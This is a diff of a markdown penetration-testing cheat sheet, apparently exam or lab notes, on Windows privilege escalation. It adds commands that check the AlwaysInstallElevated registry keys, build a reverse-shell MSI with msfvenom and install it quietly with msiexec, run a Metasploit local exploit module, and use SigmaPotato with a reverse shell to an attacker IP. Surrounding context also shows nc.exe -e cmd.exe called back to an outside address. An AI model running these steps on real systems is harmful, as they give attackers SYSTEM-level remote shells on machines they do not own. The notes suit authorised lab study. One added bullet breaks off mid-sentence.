@@ -631,24 +631,30 @@ nt authority\system
 
 <summary>AlwaysInstallElevated</summary>
 
-```shell
-reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-```
-
-```shell
-reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-```
+### Check the following registry keys:
 
 Both keys are set to 1
 
-On kali:
-
-```
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi
-```
-
 ```shell
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
+
+### Manual Method
+
+```powershell
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi
 msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
+```
+
+### OR USING METASPLOIT
+
+```powershell
+use exploit/windows/local/always_install_elevated
+set payload windows/x64/meterpreter/reverse_tcp
+set session 1
+set LHOST tun0
+run
 ```
 
 </details>
@@ -795,6 +801,7 @@ pth-winexe -U 'admin%hash' //10.10.202.204 cmd.exe
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=8443 EXITFUNC=thread -f exe -o reverse.exe
 ```
 
+* Abuse SeImpersonate privileges to obtain&#x20;
 * Run `Invoke-EventViewer`
 
 ```bash
@@ -821,6 +828,18 @@ runas /env /profile /user:Administrator "c:\temp\nc.exe -e cmd.exe 192.168.45.5 
 </details>
 
 ### Token Impersonation Attacks
+
+<details>
+
+<summary>SigmaPotato (Windows 2012 - Windows 2022)<br>Abuse seImpersonate privileges to obtain NT AUTHORITY\SYSTEM </summary>
+
+```
+.\sigmapotato.exe --revshell 192.168.45.218 4444
+```
+
+[https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
+
+</details>
 
 <details>
 
